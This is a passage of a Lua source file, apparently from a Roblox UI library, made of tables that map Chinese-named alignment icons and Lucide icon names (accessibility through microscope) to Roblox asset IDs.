	["水平分布-居中"] = "rbxassetid://8997381028",
	["codesandbox"] = "rbxassetid://7733752575",
	["垂直分布-开始"] = "rbxassetid://8997382428",
	["监视器-扬声器"] = "rbxassetid://7743869988",
	["文本-光标-输入"] = "rbxassetid://8997388094",
	["旗帜-三角形-左"] = "rbxassetid://7733798509",
	["水平两端对齐-居中"] = "rbxassetid://8997381461",
	["水平两端对齐-开始"] = "rbxassetid://8997381652",
	["水平两端对齐-结束"] = "rbxassetid://8997381549",
	["垂直两端对齐-开始"] = "rbxassetid://8997382639",
	["垂直两端对齐-结束"] = "rbxassetid://8997382584",
	["垂直居中对齐-结束"] = "rbxassetid://8997382502",
	["垂直间距-四周分散"] = "rbxassetid://8997382708",
	["垂直间距-两端对齐"] = "rbxassetid://8997382793",
	["水平间距-两端对齐"] = "rbxassetid://8997381854",
	["水平间距-两端对齐1"] = "rbxassetid://8997381738",
}

Library.Icons2 = {
	["lucide-accessibility"] = "rbxassetid://10709751939",
	["lucide-activity"] = "rbxassetid://10709752035",
	["lucide-air-vent"] = "rbxassetid://10709752131",
	["lucide-airplay"] = "rbxassetid://10709752254",
	["lucide-alarm-check"] = "rbxassetid://10709752405",
	["lucide-alarm-clock"] = "rbxassetid://10709752630",
	["lucide-alarm-clock-off"] = "rbxassetid://10709752508",
	["lucide-alarm-minus"] = "rbxassetid://10709752732",
	["lucide-alarm-plus"] = "rbxassetid://10709752825",
	["lucide-album"] = "rbxassetid://10709752906",
	["lucide-alert-circle"] = "rbxassetid://10709752996",
	["lucide-alert-octagon"] = "rbxassetid://10709753064",
	["lucide-alert-triangle"] = "rbxassetid://10709753149",
	["lucide-align-center"] = "rbxassetid://10709753570",
	["lucide-align-center-horizontal"] = "rbxassetid://10709753272",
	["lucide-align-center-vertical"] = "rbxassetid://10709753421",
	["lucide-align-end-horizontal"] = "rbxassetid://10709753692",
	["lucide-align-end-vertical"] = "rbxassetid://10709753808",
	["lucide-align-horizontal-distribute-center"] = "rbxassetid://10747779791",
	["lucide-align-horizontal-distribute-end"] = "rbxassetid://10747784534",
	["lucide-align-horizontal-distribute-start"] = "rbxassetid://10709754118",
	["lucide-align-horizontal-justify-center"] = "rbxassetid://10709754204",
	["lucide-align-horizontal-justify-end"] = "rbxassetid://10709754317",
	["lucide-align-horizontal-justify-start"] = "rbxassetid://10709754436",
	["lucide-align-horizontal-space-around"] = "rbxassetid://10709754590",
	["lucide-align-horizontal-space-between"] = "rbxassetid://10709754749",
	["lucide-align-justify"] = "rbxassetid://10709759610",
	["lucide-align-left"] = "rbxassetid://10709759764",
	["lucide-align-right"] = "rbxassetid://10709759895",
	["lucide-align-start-horizontal"] = "rbxassetid://10709760051",
	["lucide-align-start-vertical"] = "rbxassetid://10709760244",
	["lucide-align-vertical-distribute-center"] = "rbxassetid://10709760351",
	["lucide-align-vertical-distribute-end"] = "rbxassetid://10709760434",
	["lucide-align-vertical-distribute-start"] = "rbxassetid://10709760612",
	["lucide-align-vertical-justify-center"] = "rbxassetid://10709760814",
	["lucide-align-vertical-justify-end"] = "rbxassetid://10709761003",
	["lucide-align-vertical-justify-start"] = "rbxassetid://10709761176",
	["lucide-align-vertical-space-around"] = "rbxassetid://10709761324",
	["lucide-align-vertical-space-between"] = "rbxassetid://10709761434",
	["lucide-anchor"] = "rbxassetid://10709761530",
	["lucide-angry"] = "rbxassetid://10709761629",
	["lucide-annoyed"] = "rbxassetid://10709761722",
	["lucide-aperture"] = "rbxassetid://10709761813",
	["lucide-apple"] = "rbxassetid://10709761889",
	["lucide-archive"] = "rbxassetid://10709762233",
	["lucide-archive-restore"] = "rbxassetid://10709762058",
	["lucide-armchair"] = "rbxassetid://10709762327",
	["lucide-arrow-big-down"] = "rbxassetid://10747796644",
	["lucide-arrow-big-left"] = "rbxassetid://10709762574",
	["lucide-arrow-big-right"] = "rbxassetid://10709762727",
	["lucide-arrow-big-up"] = "rbxassetid://10709762879",
	["lucide-arrow-down"] = "rbxassetid://10709767827",
	["lucide-arrow-down-circle"] = "rbxassetid://10709763034",
	["lucide-arrow-down-left"] = "rbxassetid://10709767656",
	["lucide-arrow-down-right"] = "rbxassetid://10709767750",
	["lucide-arrow-left"] = "rbxassetid://10709768114",
	["lucide-arrow-left-circle"] = "rbxassetid://10709767936",
	["lucide-arrow-left-right"] = "rbxassetid://10709768019",
	["lucide-arrow-right"] = "rbxassetid://10709768347",
	["lucide-arrow-right-circle"] = "rbxassetid://10709768226",
	["lucide-arrow-up"] = "rbxassetid://10709768939",
	["lucide-arrow-up-circle"] = "rbxassetid://10709768432",
	["lucide-arrow-up-down"] = "rbxassetid://10709768538",
	["lucide-arrow-up-left"] = "rbxassetid://10709768661",
	["lucide-arrow-up-right"] = "rbxassetid://10709768787",
	["lucide-asterisk"] = "rbxassetid://10709769095",
	["lucide-at-sign"] = "rbxassetid://10709769286",
	["lucide-award"] = "rbxassetid://10709769406",
	["lucide-axe"] = "rbxassetid://10709769508",
	["lucide-axis-3d"] = "rbxassetid://10709769598",
	["lucide-baby"] = "rbxassetid://10709769732",
	["lucide-backpack"] = "rbxassetid://10709769841",
	["lucide-baggage-claim"] = "rbxassetid://10709769935",
	["lucide-banana"] = "rbxassetid://10709770005",
	["lucide-banknote"] = "rbxassetid://10709770178",
	["lucide-bar-chart"] = "rbxassetid://10709773755",
	["lucide-bar-chart-2"] = "rbxassetid://10709770317",
	["lucide-bar-chart-3"] = "rbxassetid://10709770431",
	["lucide-bar-chart-4"] = "rbxassetid://10709770560",
	["lucide-bar-chart-horizontal"] = "rbxassetid://10709773669",
	["lucide-barcode"] = "rbxassetid://10747360675",
	["lucide-baseline"] = "rbxassetid://10709773863",
	["lucide-bath"] = "rbxassetid://10709773963",
	["lucide-battery"] = "rbxassetid://10709774640",
	["lucide-battery-charging"] = "rbxassetid://10709774068",
	["lucide-battery-full"] = "rbxassetid://10709774206",
	["lucide-battery-low"] = "rbxassetid://10709774370",
	["lucide-battery-medium"] = "rbxassetid://10709774513",
	["lucide-beaker"] = "rbxassetid://10709774756",
	["lucide-bed"] = "rbxassetid://10709775036",
	["lucide-bed-double"] = "rbxassetid://10709774864",
	["lucide-bed-single"] = "rbxassetid://10709774968",
	["lucide-beer"] = "rbxassetid://10709775167",
	["lucide-bell"] = "rbxassetid://10709775704",
	["lucide-bell-minus"] = "rbxassetid://10709775241",
	["lucide-bell-off"] = "rbxassetid://10709775320",
	["lucide-bell-plus"] = "rbxassetid://10709775448",
	["lucide-bell-ring"] = "rbxassetid://10709775560",
	["lucide-bike"] = "rbxassetid://10709775894",
	["lucide-binary"] = "rbxassetid://10709776050",
	["lucide-bitcoin"] = "rbxassetid://10709776126",
	["lucide-bluetooth"] = "rbxassetid://10709776655",
	["lucide-bluetooth-connected"] = "rbxassetid://10709776240",
	["lucide-bluetooth-off"] = "rbxassetid://10709776344",
	["lucide-bluetooth-searching"] = "rbxassetid://10709776501",
	["lucide-bold"] = "rbxassetid://10747813908",
	["lucide-bomb"] = "rbxassetid://10709781460",
	["lucide-bone"] = "rbxassetid://10709781605",
	["lucide-book"] = "rbxassetid://10709781824",
	["lucide-book-open"] = "rbxassetid://10709781717",
	["lucide-bookmark"] = "rbxassetid://10709782154",
	["lucide-bookmark-minus"] = "rbxassetid://10709781919",
	["lucide-bookmark-plus"] = "rbxassetid://10709782044",
	["lucide-bot"] = "rbxassetid://10709782230",
	["lucide-box"] = "rbxassetid://10709782497",
	["lucide-box-select"] = "rbxassetid://10709782342",
	["lucide-boxes"] = "rbxassetid://10709782582",
	["lucide-briefcase"] = "rbxassetid://10709782662",
	["lucide-brush"] = "rbxassetid://10709782758",
	["lucide-bug"] = "rbxassetid://10709782845",
	["lucide-building"] = "rbxassetid://10709783051",
	["lucide-building-2"] = "rbxassetid://10709782939",
	["lucide-bus"] = "rbxassetid://10709783137",
	["lucide-cake"] = "rbxassetid://10709783217",
	["lucide-calculator"] = "rbxassetid://10709783311",
	["lucide-calendar"] = "rbxassetid://10709789505",
	["lucide-calendar-check"] = "rbxassetid://10709783474",
	["lucide-calendar-check-2"] = "rbxassetid://10709783392",
	["lucide-calendar-clock"] = "rbxassetid://10709783577",
	["lucide-calendar-days"] = "rbxassetid://10709783673",
	["lucide-calendar-heart"] = "rbxassetid://10709783835",
	["lucide-calendar-minus"] = "rbxassetid://10709783959",
	["lucide-calendar-off"] = "rbxassetid://10709788784",
	["lucide-calendar-plus"] = "rbxassetid://10709788937",
	["lucide-calendar-range"] = "rbxassetid://10709789053",
	["lucide-calendar-search"] = "rbxassetid://10709789200",
	["lucide-calendar-x"] = "rbxassetid://10709789407",
	["lucide-calendar-x-2"] = "rbxassetid://10709789329",
	["lucide-camera"] = "rbxassetid://10709789686",
	["lucide-camera-off"] = "rbxassetid://10747822677",
	["lucide-car"] = "rbxassetid://10709789810",
	["lucide-carrot"] = "rbxassetid://10709789960",
	["lucide-cast"] = "rbxassetid://10709790097",
	["lucide-charge"] = "rbxassetid://10709790202",
	["lucide-check"] = "rbxassetid://10709790644",
	["lucide-check-circle"] = "rbxassetid://10709790387",
	["lucide-check-circle-2"] = "rbxassetid://10709790298",
	["lucide-check-square"] = "rbxassetid://10709790537",
	["lucide-chef-hat"] = "rbxassetid://10709790757",
	["lucide-cherry"] = "rbxassetid://10709790875",
	["lucide-chevron-down"] = "rbxassetid://10709790948",
	["lucide-chevron-first"] = "rbxassetid://10709791015",
	["lucide-chevron-last"] = "rbxassetid://10709791130",
	["lucide-chevron-left"] = "rbxassetid://10709791281",
	["lucide-chevron-right"] = "rbxassetid://10709791437",
	["lucide-chevron-up"] = "rbxassetid://10709791523",
	["lucide-chevrons-down"] = "rbxassetid://10709796864",
	["lucide-chevrons-down-up"] = "rbxassetid://10709791632",
	["lucide-chevrons-left"] = "rbxassetid://10709797151",
	["lucide-chevrons-left-right"] = "rbxassetid://10709797006",
	["lucide-chevrons-right"] = "rbxassetid://10709797382",
	["lucide-chevrons-right-left"] = "rbxassetid://10709797274",
	["lucide-chevrons-up"] = "rbxassetid://10709797622",
	["lucide-chevrons-up-down"] = "rbxassetid://10709797508",
	["lucide-chrome"] = "rbxassetid://10709797725",
	["lucide-circle"] = "rbxassetid://10709798174",
	["lucide-circle-dot"] = "rbxassetid://10709797837",
	["lucide-circle-ellipsis"] = "rbxassetid://10709797985",
	["lucide-circle-slashed"] = "rbxassetid://10709798100",
	["lucide-citrus"] = "rbxassetid://10709798276",
	["lucide-clapperboard"] = "rbxassetid://10709798350",
	["lucide-clipboard"] = "rbxassetid://10709799288",
	["lucide-clipboard-check"] = "rbxassetid://10709798443",
	["lucide-clipboard-copy"] = "rbxassetid://10709798574",
	["lucide-clipboard-edit"] = "rbxassetid://10709798682",
	["lucide-clipboard-list"] = "rbxassetid://10709798792",
	["lucide-clipboard-signature"] = "rbxassetid://10709798890",
	["lucide-clipboard-type"] = "rbxassetid://10709798999",
	["lucide-clipboard-x"] = "rbxassetid://10709799124",
	["lucide-clock"] = "rbxassetid://10709805144",
	["lucide-clock-1"] = "rbxassetid://10709799535",
	["lucide-clock-10"] = "rbxassetid://10709799718",
	["lucide-clock-11"] = "rbxassetid://10709799818",
	["lucide-clock-12"] = "rbxassetid://10709799962",
	["lucide-clock-2"] = "rbxassetid://10709803876",
	["lucide-clock-3"] = "rbxassetid://10709803989",
	["lucide-clock-4"] = "rbxassetid://10709804164",
	["lucide-clock-5"] = "rbxassetid://10709804291",
	["lucide-clock-6"] = "rbxassetid://10709804435",
	["lucide-clock-7"] = "rbxassetid://10709804599",
	["lucide-clock-8"] = "rbxassetid://10709804784",
	["lucide-clock-9"] = "rbxassetid://10709804996",
	["lucide-cloud"] = "rbxassetid://10709806740",
	["lucide-cloud-cog"] = "rbxassetid://10709805262",
	["lucide-cloud-drizzle"] = "rbxassetid://10709805371",
	["lucide-cloud-fog"] = "rbxassetid://10709805477",
	["lucide-cloud-hail"] = "rbxassetid://10709805596",
	["lucide-cloud-lightning"] = "rbxassetid://10709805727",
	["lucide-cloud-moon"] = "rbxassetid://10709805942",
	["lucide-cloud-moon-rain"] = "rbxassetid://10709805838",
	["lucide-cloud-off"] = "rbxassetid://10709806060",
	["lucide-cloud-rain"] = "rbxassetid://10709806277",
	["lucide-cloud-rain-wind"] = "rbxassetid://10709806166",
	["lucide-cloud-snow"] = "rbxassetid://10709806374",
	["lucide-cloud-sun"] = "rbxassetid://10709806631",
	["lucide-cloud-sun-rain"] = "rbxassetid://10709806475",
	["lucide-cloudy"] = "rbxassetid://10709806859",
	["lucide-clover"] = "rbxassetid://10709806995",
	["lucide-code"] = "rbxassetid://10709810463",
	["lucide-code-2"] = "rbxassetid://10709807111",
	["lucide-codepen"] = "rbxassetid://10709810534",
	["lucide-codesandbox"] = "rbxassetid://10709810676",
	["lucide-coffee"] = "rbxassetid://10709810814",
	["lucide-cog"] = "rbxassetid://10709810948",
	["lucide-coins"] = "rbxassetid://10709811110",
	["lucide-columns"] = "rbxassetid://10709811261",
	["lucide-command"] = "rbxassetid://10709811365",
	["lucide-compass"] = "rbxassetid://10709811445",
	["lucide-component"] = "rbxassetid://10709811595",
	["lucide-concierge-bell"] = "rbxassetid://10709811706",
	["lucide-connection"] = "rbxassetid://10747361219",
	["lucide-contact"] = "rbxassetid://10709811834",
	["lucide-contrast"] = "rbxassetid://10709811939",
	["lucide-cookie"] = "rbxassetid://10709812067",
	["lucide-copy"] = "rbxassetid://10709812159",
	["lucide-copyleft"] = "rbxassetid://10709812251",
	["lucide-copyright"] = "rbxassetid://10709812311",
	["lucide-corner-down-left"] = "rbxassetid://10709812396",
	["lucide-corner-down-right"] = "rbxassetid://10709812485",
	["lucide-corner-left-down"] = "rbxassetid://10709812632",
	["lucide-corner-left-up"] = "rbxassetid://10709812784",
	["lucide-corner-right-down"] = "rbxassetid://10709812939",
	["lucide-corner-right-up"] = "rbxassetid://10709813094",
	["lucide-corner-up-left"] = "rbxassetid://10709813185",
	["lucide-corner-up-right"] = "rbxassetid://10709813281",
	["lucide-cpu"] = "rbxassetid://10709813383",
	["lucide-croissant"] = "rbxassetid://10709818125",
	["lucide-crop"] = "rbxassetid://10709818245",
	["lucide-cross"] = "rbxassetid://10709818399",
	["lucide-crosshair"] = "rbxassetid://10709818534",
	["lucide-crown"] = "rbxassetid://10709818626",
	["lucide-cup-soda"] = "rbxassetid://10709818763",
	["lucide-curly-braces"] = "rbxassetid://10709818847",
	["lucide-currency"] = "rbxassetid://10709818931",
	["lucide-database"] = "rbxassetid://10709818996",
	["lucide-delete"] = "rbxassetid://10709819059",
	["lucide-diamond"] = "rbxassetid://10709819149",
	["lucide-dice-1"] = "rbxassetid://10709819266",
	["lucide-dice-2"] = "rbxassetid://10709819361",
	["lucide-dice-3"] = "rbxassetid://10709819508",
	["lucide-dice-4"] = "rbxassetid://10709819670",
	["lucide-dice-5"] = "rbxassetid://10709819801",
	["lucide-dice-6"] = "rbxassetid://10709819896",
	["lucide-dices"] = "rbxassetid://10723343321",
	["lucide-diff"] = "rbxassetid://10723343416",
	["lucide-disc"] = "rbxassetid://10723343537",
	["lucide-divide"] = "rbxassetid://10723343805",
	["lucide-divide-circle"] = "rbxassetid://10723343636",
	["lucide-divide-square"] = "rbxassetid://10723343737",
	["lucide-dollar-sign"] = "rbxassetid://10723343958",
	["lucide-download"] = "rbxassetid://10723344270",
	["lucide-download-cloud"] = "rbxassetid://10723344088",
	["lucide-droplet"] = "rbxassetid://10723344432",
	["lucide-droplets"] = "rbxassetid://10734883356",
	["lucide-drumstick"] = "rbxassetid://10723344737",
	["lucide-edit"] = "rbxassetid://10734883598",
	["lucide-edit-2"] = "rbxassetid://10723344885",
	["lucide-edit-3"] = "rbxassetid://10723345088",
	["lucide-egg"] = "rbxassetid://10723345518",
	["lucide-egg-fried"] = "rbxassetid://10723345347",
	["lucide-electricity"] = "rbxassetid://10723345749",
	["lucide-electricity-off"] = "rbxassetid://10723345643",
	["lucide-equal"] = "rbxassetid://10723345990",
	["lucide-equal-not"] = "rbxassetid://10723345866",
	["lucide-eraser"] = "rbxassetid://10723346158",
	["lucide-euro"] = "rbxassetid://10723346372",
	["lucide-expand"] = "rbxassetid://10723346553",
	["lucide-external-link"] = "rbxassetid://10723346684",
	["lucide-eye"] = "rbxassetid://10723346959",
	["lucide-eye-off"] = "rbxassetid://10723346871",
	["lucide-factory"] = "rbxassetid://10723347051",
	["lucide-fan"] = "rbxassetid://10723354359",
	["lucide-fast-forward"] = "rbxassetid://10723354521",
	["lucide-feather"] = "rbxassetid://10723354671",
	["lucide-figma"] = "rbxassetid://10723354801",
	["lucide-file"] = "rbxassetid://10723374641",
	["lucide-file-archive"] = "rbxassetid://10723354921",
	["lucide-file-audio"] = "rbxassetid://10723355148",
	["lucide-file-audio-2"] = "rbxassetid://10723355026",
	["lucide-file-axis-3d"] = "rbxassetid://10723355272",
	["lucide-file-badge"] = "rbxassetid://10723355622",
	["lucide-file-badge-2"] = "rbxassetid://10723355451",
	["lucide-file-bar-chart"] = "rbxassetid://10723355887",
	["lucide-file-bar-chart-2"] = "rbxassetid://10723355746",
	["lucide-file-box"] = "rbxassetid://10723355989",
	["lucide-file-check"] = "rbxassetid://10723356210",
	["lucide-file-check-2"] = "rbxassetid://10723356100",
	["lucide-file-clock"] = "rbxassetid://10723356329",
	["lucide-file-code"] = "rbxassetid://10723356507",
	["lucide-file-cog"] = "rbxassetid://10723356830",
	["lucide-file-cog-2"] = "rbxassetid://10723356676",
	["lucide-file-diff"] = "rbxassetid://10723357039",
	["lucide-file-digit"] = "rbxassetid://10723357151",
	["lucide-file-down"] = "rbxassetid://10723357322",
	["lucide-file-edit"] = "rbxassetid://10723357495",
	["lucide-file-heart"] = "rbxassetid://10723357637",
	["lucide-file-image"] = "rbxassetid://10723357790",
	["lucide-file-input"] = "rbxassetid://10723357933",
	["lucide-file-json"] = "rbxassetid://10723364435",
	["lucide-file-json-2"] = "rbxassetid://10723364361",
	["lucide-file-key"] = "rbxassetid://10723364605",
	["lucide-file-key-2"] = "rbxassetid://10723364515",
	["lucide-file-line-chart"] = "rbxassetid://10723364725",
	["lucide-file-lock"] = "rbxassetid://10723364957",
	["lucide-file-lock-2"] = "rbxassetid://10723364861",
	["lucide-file-minus"] = "rbxassetid://10723365254",
	["lucide-file-minus-2"] = "rbxassetid://10723365086",
	["lucide-file-output"] = "rbxassetid://10723365457",
	["lucide-file-pie-chart"] = "rbxassetid://10723365598",
	["lucide-file-plus"] = "rbxassetid://10723365877",
	["lucide-file-plus-2"] = "rbxassetid://10723365766",
	["lucide-file-question"] = "rbxassetid://10723365987",
	["lucide-file-scan"] = "rbxassetid://10723366167",
	["lucide-file-search"] = "rbxassetid://10723366550",
	["lucide-file-search-2"] = "rbxassetid://10723366340",
	["lucide-file-signature"] = "rbxassetid://10723366741",
	["lucide-file-spreadsheet"] = "rbxassetid://10723366962",
	["lucide-file-symlink"] = "rbxassetid://10723367098",
	["lucide-file-terminal"] = "rbxassetid://10723367244",
	["lucide-file-text"] = "rbxassetid://10723367380",
	["lucide-file-type"] = "rbxassetid://10723367606",
	["lucide-file-type-2"] = "rbxassetid://10723367509",
	["lucide-file-up"] = "rbxassetid://10723367734",
	["lucide-file-video"] = "rbxassetid://10723373884",
	["lucide-file-video-2"] = "rbxassetid://10723367834",
	["lucide-file-volume"] = "rbxassetid://10723374172",
	["lucide-file-volume-2"] = "rbxassetid://10723374030",
	["lucide-file-warning"] = "rbxassetid://10723374276",
	["lucide-file-x"] = "rbxassetid://10723374544",
	["lucide-file-x-2"] = "rbxassetid://10723374378",
	["lucide-files"] = "rbxassetid://10723374759",
	["lucide-film"] = "rbxassetid://10723374981",
	["lucide-filter"] = "rbxassetid://10723375128",
	["lucide-fingerprint"] = "rbxassetid://10723375250",
	["lucide-flag"] = "rbxassetid://10723375890",
	["lucide-flag-off"] = "rbxassetid://10723375443",
	["lucide-flag-triangle-left"] = "rbxassetid://10723375608",
	["lucide-flag-triangle-right"] = "rbxassetid://10723375727",
	["lucide-flame"] = "rbxassetid://10723376114",
	["lucide-flashlight"] = "rbxassetid://10723376471",
	["lucide-flashlight-off"] = "rbxassetid://10723376365",
	["lucide-flask-conical"] = "rbxassetid://10734883986",
	["lucide-flask-round"] = "rbxassetid://10723376614",
	["lucide-flip-horizontal"] = "rbxassetid://10723376884",
	["lucide-flip-horizontal-2"] = "rbxassetid://10723376745",
	["lucide-flip-vertical"] = "rbxassetid://10723377138",
	["lucide-flip-vertical-2"] = "rbxassetid://10723377026",
	["lucide-flower"] = "rbxassetid://10747830374",
	["lucide-flower-2"] = "rbxassetid://10723377305",
	["lucide-focus"] = "rbxassetid://10723377537",
	["lucide-folder"] = "rbxassetid://10723387563",
	["lucide-folder-archive"] = "rbxassetid://10723384478",
	["lucide-folder-check"] = "rbxassetid://10723384605",
	["lucide-folder-clock"] = "rbxassetid://10723384731",
	["lucide-folder-closed"] = "rbxassetid://10723384893",
	["lucide-folder-cog"] = "rbxassetid://10723385213",
	["lucide-folder-cog-2"] = "rbxassetid://10723385036",
	["lucide-folder-down"] = "rbxassetid://10723385338",
	["lucide-folder-edit"] = "rbxassetid://10723385445",
	["lucide-folder-heart"] = "rbxassetid://10723385545",
	["lucide-folder-input"] = "rbxassetid://10723385721",
	["lucide-folder-key"] = "rbxassetid://10723385848",
	["lucide-folder-lock"] = "rbxassetid://10723386005",
	["lucide-folder-minus"] = "rbxassetid://10723386127",
	["lucide-folder-open"] = "rbxassetid://10723386277",
	["lucide-folder-output"] = "rbxassetid://10723386386",
	["lucide-folder-plus"] = "rbxassetid://10723386531",
	["lucide-folder-search"] = "rbxassetid://10723386787",
	["lucide-folder-search-2"] = "rbxassetid://10723386674",
	["lucide-folder-symlink"] = "rbxassetid://10723386930",
	["lucide-folder-tree"] = "rbxassetid://10723387085",
	["lucide-folder-up"] = "rbxassetid://10723387265",
	["lucide-folder-x"] = "rbxassetid://10723387448",
	["lucide-folders"] = "rbxassetid://10723387721",
	["lucide-form-input"] = "rbxassetid://10723387841",
	["lucide-forward"] = "rbxassetid://10723388016",
	["lucide-frame"] = "rbxassetid://10723394389",
	["lucide-framer"] = "rbxassetid://10723394565",
	["lucide-frown"] = "rbxassetid://10723394681",
	["lucide-fuel"] = "rbxassetid://10723394846",
	["lucide-function-square"] = "rbxassetid://10723395041",
	["lucide-gamepad"] = "rbxassetid://10723395457",
	["lucide-gamepad-2"] = "rbxassetid://10723395215",
	["lucide-gauge"] = "rbxassetid://10723395708",
	["lucide-gavel"] = "rbxassetid://10723395896",
	["lucide-gem"] = "rbxassetid://10723396000",
	["lucide-ghost"] = "rbxassetid://10723396107",
	["lucide-gift"] = "rbxassetid://10723396402",
	["lucide-gift-card"] = "rbxassetid://10723396225",
	["lucide-git-branch"] = "rbxassetid://10723396676",
	["lucide-git-branch-plus"] = "rbxassetid://10723396542",
	["lucide-git-commit"] = "rbxassetid://10723396812",
	["lucide-git-compare"] = "rbxassetid://10723396954",
	["lucide-git-fork"] = "rbxassetid://10723397049",
	["lucide-git-merge"] = "rbxassetid://10723397165",
	["lucide-git-pull-request"] = "rbxassetid://10723397431",
	["lucide-git-pull-request-closed"] = "rbxassetid://10723397268",
	["lucide-git-pull-request-draft"] = "rbxassetid://10734884302",
	["lucide-glass"] = "rbxassetid://10723397788",
	["lucide-glass-2"] = "rbxassetid://10723397529",
	["lucide-glass-water"] = "rbxassetid://10723397678",
	["lucide-glasses"] = "rbxassetid://10723397895",
	["lucide-globe"] = "rbxassetid://10723404337",
	["lucide-globe-2"] = "rbxassetid://10723398002",
	["lucide-grab"] = "rbxassetid://10723404472",
	["lucide-graduation-cap"] = "rbxassetid://10723404691",
	["lucide-grape"] = "rbxassetid://10723404822",
	["lucide-grid"] = "rbxassetid://10723404936",
	["lucide-grip-horizontal"] = "rbxassetid://10723405089",
	["lucide-grip-vertical"] = "rbxassetid://10723405236",
	["lucide-hammer"] = "rbxassetid://10723405360",
	["lucide-hand"] = "rbxassetid://10723405649",
	["lucide-hand-metal"] = "rbxassetid://10723405508",
	["lucide-hard-drive"] = "rbxassetid://10723405749",
	["lucide-hard-hat"] = "rbxassetid://10723405859",
	["lucide-hash"] = "rbxassetid://10723405975",
	["lucide-haze"] = "rbxassetid://10723406078",
	["lucide-headphones"] = "rbxassetid://10723406165",
	["lucide-heart"] = "rbxassetid://10723406885",
	["lucide-heart-crack"] = "rbxassetid://10723406299",
	["lucide-heart-handshake"] = "rbxassetid://10723406480",
	["lucide-heart-off"] = "rbxassetid://10723406662",
	["lucide-heart-pulse"] = "rbxassetid://10723406795",
	["lucide-help-circle"] = "rbxassetid://10723406988",
	["lucide-hexagon"] = "rbxassetid://10723407092",
	["lucide-highlighter"] = "rbxassetid://10723407192",
	["lucide-history"] = "rbxassetid://10723407335",
	["lucide-home"] = "rbxassetid://10723407389",
	["lucide-hourglass"] = "rbxassetid://10723407498",
	["lucide-ice-cream"] = "rbxassetid://10723414308",
	["lucide-image"] = "rbxassetid://10723415040",
	["lucide-image-minus"] = "rbxassetid://10723414487",
	["lucide-image-off"] = "rbxassetid://10723414677",
	["lucide-image-plus"] = "rbxassetid://10723414827",
	["lucide-import"] = "rbxassetid://10723415205",
	["lucide-inbox"] = "rbxassetid://10723415335",
	["lucide-indent"] = "rbxassetid://10723415494",
	["lucide-indian-rupee"] = "rbxassetid://10723415642",
	["lucide-infinity"] = "rbxassetid://10723415766",
	["lucide-info"] = "rbxassetid://10723415903",
	["lucide-inspect"] = "rbxassetid://10723416057",
	["lucide-italic"] = "rbxassetid://10723416195",
	["lucide-japanese-yen"] = "rbxassetid://10723416363",
	["lucide-joystick"] = "rbxassetid://10723416527",
	["lucide-key"] = "rbxassetid://10723416652",
	["lucide-keyboard"] = "rbxassetid://10723416765",
	["lucide-lamp"] = "rbxassetid://10723417513",
	["lucide-lamp-ceiling"] = "rbxassetid://10723416922",
	["lucide-lamp-desk"] = "rbxassetid://10723417016",
	["lucide-lamp-floor"] = "rbxassetid://10723417131",
	["lucide-lamp-wall-down"] = "rbxassetid://10723417240",
	["lucide-lamp-wall-up"] = "rbxassetid://10723417356",
	["lucide-landmark"] = "rbxassetid://10723417608",
	["lucide-languages"] = "rbxassetid://10723417703",
	["lucide-laptop"] = "rbxassetid://10723423881",
	["lucide-laptop-2"] = "rbxassetid://10723417797",
	["lucide-lasso"] = "rbxassetid://10723424235",
	["lucide-lasso-select"] = "rbxassetid://10723424058",
	["lucide-laugh"] = "rbxassetid://10723424372",
	["lucide-layers"] = "rbxassetid://10723424505",
	["lucide-layout"] = "rbxassetid://10723425376",
	["lucide-layout-dashboard"] = "rbxassetid://10723424646",
	["lucide-layout-grid"] = "rbxassetid://10723424838",
	["lucide-layout-list"] = "rbxassetid://10723424963",
	["lucide-layout-template"] = "rbxassetid://10723425187",
	["lucide-leaf"] = "rbxassetid://10723425539",
	["lucide-library"] = "rbxassetid://10723425615",
	["lucide-life-buoy"] = "rbxassetid://10723425685",
	["lucide-lightbulb"] = "rbxassetid://10723425852",
	["lucide-lightbulb-off"] = "rbxassetid://10723425762",
	["lucide-line-chart"] = "rbxassetid://10723426393",
	["lucide-link"] = "rbxassetid://10723426722",
	["lucide-link-2"] = "rbxassetid://10723426595",
	["lucide-link-2-off"] = "rbxassetid://10723426513",
	["lucide-list"] = "rbxassetid://10723433811",
	["lucide-list-checks"] = "rbxassetid://10734884548",
	["lucide-list-end"] = "rbxassetid://10723426886",
	["lucide-list-minus"] = "rbxassetid://10723426986",
	["lucide-list-music"] = "rbxassetid://10723427081",
	["lucide-list-ordered"] = "rbxassetid://10723427199",
	["lucide-list-plus"] = "rbxassetid://10723427334",
	["lucide-list-start"] = "rbxassetid://10723427494",
	["lucide-list-video"] = "rbxassetid://10723427619",
	["lucide-list-x"] = "rbxassetid://10723433655",
	["lucide-loader"] = "rbxassetid://10723434070",
	["lucide-loader-2"] = "rbxassetid://10723433935",
	["lucide-locate"] = "rbxassetid://10723434557",
	["lucide-locate-fixed"] = "rbxassetid://10723434236",
	["lucide-locate-off"] = "rbxassetid://10723434379",
	["lucide-lock"] = "rbxassetid://10723434711",
	["lucide-log-in"] = "rbxassetid://10723434830",
	["lucide-log-out"] = "rbxassetid://10723434906",
	["lucide-luggage"] = "rbxassetid://10723434993",
	["lucide-magnet"] = "rbxassetid://10723435069",
	["lucide-mail"] = "rbxassetid://10734885430",
	["lucide-mail-check"] = "rbxassetid://10723435182",
	["lucide-mail-minus"] = "rbxassetid://10723435261",
	["lucide-mail-open"] = "rbxassetid://10723435342",
	["lucide-mail-plus"] = "rbxassetid://10723435443",
	["lucide-mail-question"] = "rbxassetid://10723435515",
	["lucide-mail-search"] = "rbxassetid://10734884739",
	["lucide-mail-warning"] = "rbxassetid://10734885015",
	["lucide-mail-x"] = "rbxassetid://10734885247",
	["lucide-mails"] = "rbxassetid://10734885614",
	["lucide-map"] = "rbxassetid://10734886202",
	["lucide-map-pin"] = "rbxassetid://10734886004",
	["lucide-map-pin-off"] = "rbxassetid://10734885803",
	["lucide-maximize"] = "rbxassetid://10734886735",
	["lucide-maximize-2"] = "rbxassetid://10734886496",
	["lucide-medal"] = "rbxassetid://10734887072",
	["lucide-megaphone"] = "rbxassetid://10734887454",
	["lucide-megaphone-off"] = "rbxassetid://10734887311",
	["lucide-meh"] = "rbxassetid://10734887603",
	["lucide-menu"] = "rbxassetid://10734887784",
	["lucide-message-circle"] = "rbxassetid://10734888000",
	["lucide-message-square"] = "rbxassetid://10734888228",
	["lucide-mic"] = "rbxassetid://10734888864",
	["lucide-mic-2"] = "rbxassetid://10734888430",
	["lucide-mic-off"] = "rbxassetid://10734888646",
	["lucide-microscope"] = "rbxassetid://10734889106",
